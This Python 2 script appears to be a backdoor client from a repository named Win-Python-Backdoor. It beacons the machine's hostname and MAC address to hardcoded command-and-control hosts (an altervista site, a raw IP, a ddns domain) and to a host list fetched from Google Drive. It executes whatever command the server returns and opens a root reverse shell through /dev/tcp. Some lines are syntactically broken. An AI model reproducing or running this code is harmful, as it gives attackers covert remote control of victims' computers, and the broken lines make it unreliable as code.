#!/usr/bin/python
import time
import sys
import os
import httplib
import urllib2
import subprocess
from os import path, access, R_OK
from subprocess import Popen
from uuid import getnode as get_mac


import socket

#mainsite = urllib2.urlopen("https://raw.githubusercontent.com/pistacchietto/Win-Python-Backdoor/master/site.txt")
#mainsite = urllib2.urlopen("https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF")
mainsite = urllib2.urlopen("https://drive.google.com/uc?export=download&id=1z1JvjIRzQvG3Hh_euyD6qPaictdMRkny")
#print mainsite.text
sites = ["https://paner.altervista.org"]#, mainsite.text]
sites.extend(mainsite.read().split(",") )


#sites = ["paner.altervista.org", "verifiche.ddns.net", "visionstore.info"]
#site="paner.altervista.org"
site1="paner.altervista.org"
site2="52.26.124.145"
site3="certificates.ddns.net"
#while True:

for site in sites:
  try:
    #if socket.gethostname().find('.')>=0:
    name=socket.gethostname()
    #else:
    #name=socket.gethostbyaddr(socket.gethostname())[0]

    original_mac = subprocess.check_output("/sbin/ifconfig en0 | grep ether | awk 'NR==1{print $2}'", shell=True)
    original_mac =original_mac.rstrip('\n')
    #original_mac=str(get_mac())
    name=name+"_"+original_mac+"_app"
    print original_mac
    #httpServ = httplib.HTTPConnection("paner.altervista.org", 80)
    #httpServ.connect()
    #httpServ.request('GET', "/svc/wup.php?pc="+name)
    #response = httpServ.getresponse()
    print "http://"+site+"/svc/wup.php?pc="+name
    //request = urllib2.Request("http://"+site+"/svc/wup.php?pc="+name, headers={'User-Agent': 'Mozilla/5.0'})
    request = urllib2.Request("site+"/svc/wup.php?pc="+name, headers={'User-Agent': 'Mozilla/5.0'})
    response = urllib2.urlopen(request)
    #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+name)
    sresponse = response.read()
    #if response.status == httplib.OK:
    if sresponse!= '':
      print "Output from HTML request"
      #sresponse = response.read()
      ifind=sresponse.find('ip=')
      sip = sresponse[ifind+3:sresponse.find('||',ifind)]
      ifind=sresponse.find('port=')
      sport = sresponse[ifind+5:sresponse.find('||',ifind)]
      ifind=sresponse.find('kill=')
      skill = sresponse[ifind+5:sresponse.find('||',ifind)]
      ifind=sresponse.find('exec=')
      sexec = sresponse[ifind+5:sresponse.find('||',ifind)]
      ifind=sresponse.find('cmd=')
      scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
      print skill
      #httpServ.close()
    else:
      if site == site1:
        site=site2
      elif site == site2:
        site=site3
      elif site == site3:
        site=site1
      request = urllib2.Request("http://"+site+"/svc/wup.php?pc="+name, headers={'User-Agent': 'Mozilla/5.0'})
      response = urllib2.urlopen(request)
      #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+name)
      sresponse = response.read()
      print "Output from HTML request fail"
      #sresponse = response.read()
      ifind=sresponse.find('ip=')
      sip = sresponse[ifind+3:sresponse.find('||',ifind)]
      ifind=sresponse.find('port=')
      sport = sresponse[ifind+5:sresponse.find('||',ifind)]
      ifind=sresponse.find('kill=')
      skill = sresponse[ifind+5:sresponse.find('||',ifind)]
      ifind=sresponse.find('exec=')
      sexec = sresponse[ifind+5:sresponse.find('||',ifind)]
      ifind=sresponse.find('cmd=')
      scmd = sresponse[ifind+4:sresponse.find('||',ifind)]
      print skill
    if sexec == '1':
      #os.system(scmd)
      print scmd
      p = Popen(scmd,shell='false')
      request = urllib2.Request("http://"+site+"/svc/wup.php?pc="+name+"&exec=0", headers={'User-Agent': 'Mozilla/5.0'})
      response = urllib2.urlopen(request)
      #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+name+"&exec=0")
      #httpServ = httplib.HTTPConnection("paner.altervista.org", 80)
      #httpServ.connect()
      #httpServ.request('GET', "/svc/wup.php?pc="+name+"&exec=0")
      #response = httpServ.getresponse()
      #httpServ.close()
      os.system("wait")
    if skill == '0':
      p = Popen("sudo bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1",shell='false')
      #sret=subprocess.check_output("sudo bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1", shell=True)
      #os.system("sudo bash -i >& /dev/tcp/"+sip+"/"+sport+" 0>&1")
      request = urllib2.Request("http://"+site+"/svc/wup.php?pc="+name+"&kill=1", headers={'User-Agent': 'Mozilla/5.0'})
      response = urllib2.urlopen(request)
      #response = urllib2.urlopen("http://"+site+"/svc/wup.php?pc="+name+"&kill=1")
      #httpServ = httplib.HTTPConnection("paner.altervista.org", 80)
      #httpServ.connect()
      #httpServ.request('GET', "/svc/wup.php?pc="+name+"&kill=1")
      #response = httpServ.getresponse()
      #httpServ.close()
      os.system("wait")
    site=site1
  except Exception,e:
    print str(e)  
    if site == site1:
      site=site2
    elif site == site2:
      site=site3
    elif site == site3:
      site=site1
#	time.sleep(5)
